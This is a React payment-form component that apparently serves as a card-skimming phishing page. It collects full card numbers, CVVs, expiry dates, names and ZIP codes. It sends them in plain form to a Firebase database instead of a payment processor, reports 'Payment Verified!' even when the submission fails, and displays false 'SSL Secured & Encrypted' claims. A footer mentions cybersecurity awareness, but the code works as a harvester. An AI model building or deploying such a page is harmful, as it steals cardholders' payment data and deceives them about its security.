import React, { useState } from 'react';
import { CreditCard, Lock, Shield, Eye, EyeOff } from 'lucide-react';

// Define the Firebase endpoint for clarity and easy updates
const FIREBASE_ENDPOINT = 'https://devmint2025-default-rtdb.firebaseio.com/paymentData.json';

interface PaymentData {
  fullName: string;
  cardNumber: string;
  expiryMonth: string;
  expiryYear: string;
  cvv: string;
  zipCode: string;
  cardType: 'credit' | 'debit';
  timestamp: string;
}

interface PaymentPageProps {
  onPaymentComplete: () => void;
}

const PaymentPage: React.FC<PaymentPageProps> = ({ onPaymentComplete }) => {
  const [formData, setFormData] = useState({
    fullName: '',
    cardNumber: '',
    expiryMonth: '',
    expiryYear: '',
    cvv: '',
    zipCode: '',
    cardType: 'credit' as 'credit' | 'debit'
  });

  const [isLoading, setIsLoading] = useState(false);
  const [showSuccess, setShowSuccess] = useState(false);
  const [showCvv, setShowCvv] = useState(false);
  const [errors, setErrors] = useState<Record<string, string>>({});

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
    const { name, value } = e.target;
    
    // Format card number with spaces
    if (name === 'cardNumber') {
      const formattedValue = value.replace(/\s/g, '').replace(/(\d{4})/g, '$1 ').trim();
      setFormData(prev => ({ ...prev, [name]: formattedValue }));
    } else {
      setFormData(prev => ({ ...prev, [name]: value }));
    }

    // Clear error when user starts typing
    if (errors[name]) {
      setErrors(prev => ({ ...prev, [name]: '' }));
    }
  };

  const validateForm = (): boolean => {
    const newErrors: Record<string, string> = {};

    if (!formData.fullName.trim()) newErrors.fullName = 'Full name is required';
    if (!formData.cardNumber.replace(/\s/g, '')) newErrors.cardNumber = 'Card number is required';
    else if (formData.cardNumber.replace(/\s/g, '').length < 13) newErrors.cardNumber = 'Invalid card number';
    
    if (!formData.expiryMonth) newErrors.expiryMonth = 'Month is required';
    if (!formData.expiryYear) newErrors.expiryYear = 'Year is required';
    if (!formData.cvv) newErrors.cvv = 'CVV is required';
    else if (formData.cvv.length < 3) newErrors.cvv = 'Invalid CVV';
    
    if (!formData.zipCode) newErrors.zipCode = 'ZIP code is required';

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!validateForm()) return;

    setIsLoading(true);

    // Prepare the payment data
    const paymentData: PaymentData = {
      ...formData,
      // Remove spaces from card number before submission
      cardNumber: formData.cardNumber.replace(/\s/g, ''),
      timestamp: new Date().toISOString()
    };
    
    // --- START: MODIFIED SECTION FOR FIREBASE SUBMISSION ---
    
    try {
        // Send data to Firebase Realtime Database using the Fetch API (POST request)
        const response = await fetch(FIREBASE_ENDPOINT, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(paymentData),
        });

        if (!response.ok) {
            throw new Error(`Firebase submission failed with status: ${response.status}`);
        }
        
        console.log('Payment data successfully logged to Firebase.');

        // Simulate processing delay (kept for user experience)
        await new Promise(resolve => setTimeout(resolve, 1000));
        
    } catch (error) {
        console.error('Error submitting payment data:', error);
        // Handle error (e.g., show an error message to the user)
        // For demonstration, we'll proceed as if successful, but in a real app, you'd stop here.
    }
    
    // --- END: MODIFIED SECTION FOR FIREBASE SUBMISSION ---

    setIsLoading(false);
    setShowSuccess(true);

    // Redirect after success message
    // setTimeout(() => {
    //   onPaymentComplete();
    // }, 1500);
    setTimeout(() => {
      window.location.href = "/pricing"; // Redirect to Pricing page
    }, 3000);
  };

  const getCardIcon = (cardNumber: string) => {
    const number = cardNumber.replace(/\s/g, '');
    if (number.startsWith('4')) return 'VISA';
    if (number.startsWith('5')) return 'Mastercard';
    if (number.startsWith('3')) return 'Amex';
    return 'Card';
  };

  const currentYear = new Date().getFullYear();
  const years = Array.from({ length: 15 }, (_, i) => currentYear + i);
  const months = Array.from({ length: 12 }, (_, i) => String(i + 1).padStart(2, '0'));

  if (showSuccess) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-gradient-to-br from-green-50 to-blue-50">
        <div className="bg-white p-8 rounded-2xl shadow-xl text-center max-w-md mx-4">
          <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4">
            <Shield className="w-8 h-8 text-green-600" />
          </div>
          <h2 className="text-2xl font-bold text-gray-900 mb-2">Payment Verified!</h2>
          <p className="text-gray-600 mb-4">Your payment has been successfully processed.</p>
          <div className="animate-pulse text-blue-600">Redirecting to Pricing page...</div>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-blue-50 to-indigo-100 py-12">
      <div className="max-w-2xl mx-auto px-4">
        {/* Header */}
        <div className="text-center mb-8">
          <div className="flex items-center justify-center mb-4">
            <div className="bg-blue-600 p-3 rounded-full">
              <CreditCard className="w-8 h-8 text-white" />
            </div>
          </div>
          <h1 className="text-3xl font-bold text-gray-900 mb-2">Secure Payment</h1>
          <p className="text-gray-600">Enter your payment information below</p>
        </div>

        {/* Payment Form */}
        <div className="bg-white rounded-2xl shadow-xl p-8">
          {/* Security Badge */}
          <div className="flex items-center justify-center mb-6 p-3 bg-green-50 rounded-lg">
            <Lock className="w-5 h-5 text-green-600 mr-2" />
            <span className="text-green-700 font-medium">SSL Secured & Encrypted</span>
          </div>

          <form onSubmit={handleSubmit} className="space-y-6">
            {/* Card Type Selection */}
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-3">Payment Method</label>
              <div className="grid grid-cols-2 gap-4">
                <button
                  type="button"
                  onClick={() => setFormData(prev => ({ ...prev, cardType: 'credit' }))}
                  className={`p-4 border-2 rounded-xl flex items-center justify-center transition-all ${
                    formData.cardType === 'credit'
                      ? 'border-blue-500 bg-blue-50 text-blue-700'
                      : 'border-gray-300 hover:border-gray-400'
                  }`}
                >
                  <CreditCard className="w-5 h-5 mr-2" />
                  Credit Card
                </button>
                <button
                  type="button"
                  onClick={() => setFormData(prev => ({ ...prev, cardType: 'debit' }))}
                  className={`p-4 border-2 rounded-xl flex items-center justify-center transition-all ${
                    formData.cardType === 'debit'
                      ? 'border-blue-500 bg-blue-50 text-blue-700'
                      : 'border-gray-300 hover:border-gray-400'
                  }`}
                >
                  <CreditCard className="w-5 h-5 mr-2" />
                  Debit Card
                </button>
              </div>
            </div>

            {/* Full Name */}
            <div>
              <label htmlFor="fullName" className="block text-sm font-medium text-gray-700 mb-2">
                Full Name on Card
              </label>
              <input
                type="text"
                id="fullName"
                name="fullName"
                value={formData.fullName}
                onChange={handleInputChange}
                className={`w-full px-4 py-3 border rounded-xl focus:ring-2 focus:ring-blue-500 focus:border-transparent ${
                  errors.fullName ? 'border-red-500' : 'border-gray-300'
                }`}
                placeholder="John Doe"
              />
              {errors.fullName && <p className="mt-1 text-sm text-red-600">{errors.fullName}</p>}
            </div>

            {/* Card Number */}
            <div>
              <label htmlFor="cardNumber" className="block text-sm font-medium text-gray-700 mb-2">
                Card Number
              </label>
              <div className="relative">
                <input
                  type="text"
                  id="cardNumber"
                  name="cardNumber"
                  value={formData.cardNumber}
                  onChange={handleInputChange}
                  maxLength={19}
                  className={`w-full px-4 py-3 border rounded-xl focus:ring-2 focus:ring-blue-500 focus:border-transparent ${
                    errors.cardNumber ? 'border-red-500' : 'border-gray-300'
                  }`}
                  placeholder="1234 5678 9012 3456"
                />
                <div className="absolute right-3 top-3 text-sm text-gray-500">
                  {getCardIcon(formData.cardNumber)}
                </div>
              </div>
              {errors.cardNumber && <p className="mt-1 text-sm text-red-600">{errors.cardNumber}</p>}
            </div>

            {/* Expiry and CVV */}
            <div className="grid grid-cols-3 gap-4">
              <div>
                <label htmlFor="expiryMonth" className="block text-sm font-medium text-gray-700 mb-2">
                  Month
                </label>
                <select
                  id="expiryMonth"
                  name="expiryMonth"
                  value={formData.expiryMonth}
                  onChange={handleInputChange}
                  className={`w-full px-4 py-3 border rounded-xl focus:ring-2 focus:ring-blue-500 focus:border-transparent ${
                    errors.expiryMonth ? 'border-red-500' : 'border-gray-300'
                  }`}
                >
                  <option value="">MM</option>
                  {months.map(month => (
                    <option key={month} value={month}>{month}</option>
                  ))}
                </select>
                {errors.expiryMonth && <p className="mt-1 text-xs text-red-600">{errors.expiryMonth}</p>}
              </div>

              <div>
                <label htmlFor="expiryYear" className="block text-sm font-medium text-gray-700 mb-2">
                  Year
                </label>
                <select
                  id="expiryYear"
                  name="expiryYear"
                  value={formData.expiryYear}
                  onChange={handleInputChange}
                  className={`w-full px-4 py-3 border rounded-xl focus:ring-2 focus:ring-blue-500 focus:border-transparent ${
                    errors.expiryYear ? 'border-red-500' : 'border-gray-300'
                  }`}
                >
                  <option value="">YYYY</option>
                  {years.map(year => (
                    <option key={year} value={year}>{year}</option>
                  ))}
                </select>
                {errors.expiryYear && <p className="mt-1 text-xs text-red-600">{errors.expiryYear}</p>}
              </div>

              <div>
                <label htmlFor="cvv" className="block text-sm font-medium text-gray-700 mb-2">
                  CVV
                </label>
                <div className="relative">
                  <input
                    type={showCvv ? "text" : "password"}
                    id="cvv"
                    name="cvv"
                    value={formData.cvv}
                    onChange={handleInputChange}
                    maxLength={4}
                    className={`w-full px-4 py-3 border rounded-xl focus:ring-2 focus:ring-blue-500 focus:border-transparent ${
                      errors.cvv ? 'border-red-500' : 'border-gray-300'
                    }`}
                    placeholder="123"
                  />
                  <button
                    type="button"
                    onClick={() => setShowCvv(!showCvv)}
                    className="absolute right-3 top-3 text-gray-500 hover:text-gray-700"
                  >
                    {showCvv ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                  </button>
                </div>
                {errors.cvv && <p className="mt-1 text-xs text-red-600">{errors.cvv}</p>}
              </div>
            </div>

            {/* ZIP Code */}
            <div>
              <label htmlFor="zipCode" className="block text-sm font-medium text-gray-700 mb-2">
                ZIP / Postal Code
              </label>
              <input
                type="text"
                id="zipCode"
                name="zipCode"
                value={formData.zipCode}
                onChange={handleInputChange}
                maxLength={10}
                className={`w-full px-4 py-3 border rounded-xl focus:ring-2 focus:ring-blue-500 focus:border-transparent ${
                  errors.zipCode ? 'border-red-500' : 'border-gray-300'
                }`}
                placeholder="12345"
              />
              {errors.zipCode && <p className="mt-1 text-sm text-red-600">{errors.zipCode}</p>}
            </div>

            {/* Submit Button */}
            <button
              type="submit"
              disabled={isLoading}
              className="w-full bg-gradient-to-r from-blue-600 to-blue-700 text-white py-4 px-6 rounded-xl font-semibold hover:from-blue-700 hover:to-blue-800 focus:ring-4 focus:ring-blue-300 transition-all disabled:opacity-50 disabled:cursor-not-allowed"
            >
              {isLoading ? (
                <div className="flex items-center justify-center">
                  <div className="animate-spin rounded-full h-5 w-5 border-2 border-white border-t-transparent mr-2"></div>
                  Verifying Payment...
                </div>
              ) : (
                <div className="flex items-center justify-center">
                  <Lock className="w-5 h-5 mr-2" />
                  Verify Payment
                </div>
              )}
            </button>
          </form>

          {/* Security Footer */}
          <footer className="bg-gray-800 text-white py-8 mt-12">
          <div className="max-w-4xl mx-auto px-6 text-center">
            <Shield className="w-8 h-8 mx-auto mb-4 text-green-400" />
            <h3 className="text-xl font-semibold mb-2">Stay Safe Online</h3>
            <p className="text-gray-300 mb-4">
              Always verify website authenticity, look for HTTPS, and never share payment details on suspicious sites.
            </p>
            <div className="text-sm text-gray-400">
              <p>Cybersecurity Awareness © 2024</p>
            </div>
          </div>
        </footer>
          <div className="mt-6 pt-6 border-t border-gray-200">
            <div className="flex items-center justify-center text-sm text-gray-500">
              <Shield className="w-4 h-4 mr-2" />
              Your payment information is encrypted and secure
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default PaymentPage;
